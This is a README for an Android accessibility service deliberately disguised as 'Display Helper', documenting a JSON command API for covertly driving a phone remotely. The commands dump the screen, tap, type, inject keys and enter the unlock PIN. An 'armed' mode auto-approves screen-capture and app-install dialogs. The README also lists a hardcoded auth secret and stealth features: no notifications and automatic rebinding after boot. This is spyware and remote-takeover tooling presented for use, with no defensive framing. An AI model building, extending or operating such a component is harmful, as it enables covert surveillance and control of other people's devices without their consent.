# ghosta — sidekick app (accessibility UI driver)

Innocuous-looking ("Display Helper") accessibility service that exposes the
device UI as a generic, remotely-drivable API over a loopback TCP socket.
No hardcoded app flows — the operator (or an AI agent) inspects the node
tree and decides what to tap (see PROJECT.md, "Dynamic UI driving").

## Local link (for ghostd / client-main)

- TCP `127.0.0.1:7777`, newline-delimited JSON, one response per request.
- First line must be `{"auth":"gh0stA-9fXq2Lm7Pz4t"}` (constant
  `LocalLinkServer.SECRET` — bake the same value into ghostd; change in
  both places if rotated).

### Commands

    {"cmd":"status"}                                  → armed flag, confirm list
    {"cmd":"dump"}                                    → full node tree (nested)
    {"cmd":"find","text":"Allow"}                     → matches on text/desc
    {"cmd":"find","id":"pin_entry"}                   → matches view resource id
    {"cmd":"tap","id":"root/0/3"}   or {"cmd":"tap","x":540,"y":1800}
    {"cmd":"longclick","id":...}     or {"cmd":"longclick","x":..,"y":..}
    {"cmd":"type","text":"hello"}                     → SET_TEXT on given/focused
                                                      editable node (appends),
                                                      key-by-key fallback
    {"cmd":"key","code":66}                           → key event (KEYCODE_*)
    {"cmd":"swipe","x1":..,"y1":..,"x2":..,"y2":..,"duration":300}
    {"cmd":"unlock","pin":"1234"}                     → SET_TEXT/keys/keypad,
                                                      then ENTER
    {"cmd":"arm"} / {"cmd":"disarm"}                  → auto-confirm toggle
    {"cmd":"ping"}

Responses: `{"ok":true,...}` or `{"ok":false,"error":"..."}`.

Node `id` is an index path from the root (`"root"`, `"root/0"`,
`"root/0/3"`). Ids are only valid until the screen changes — re-`find`
after any transition. `find` results are shallow (children chopped).

### armed (auto-confirm)

When armed, window-state/content-change events trigger a scan for clickable
nodes whose text or contentDescription exactly matches one of
`GhostAccessibilityService.CONFIRM_TEXTS` (Allow, OK, Start now,
Install, Continue, While using the app, …) and auto-tap them — this
auto-confirms MediaProjection and installer dialogs. Default: OFF
(re-armed by ghostd after each boot/rebind).

## Notes / deviations

- Key events are injected via `Instrumentation` (no public service API for
  arbitrary key injection); `unlock` and `tap` have node-click fallbacks
  so an OEM blocking instrumentation still works.
- `type` appends to existing field text; `unlock` sets the PIN exactly.
- No FGS, no notifications, no INTERNET permission (loopback only).
- Boot receiver is a no-op log — the system rebinds the accessibility
  service automatically.
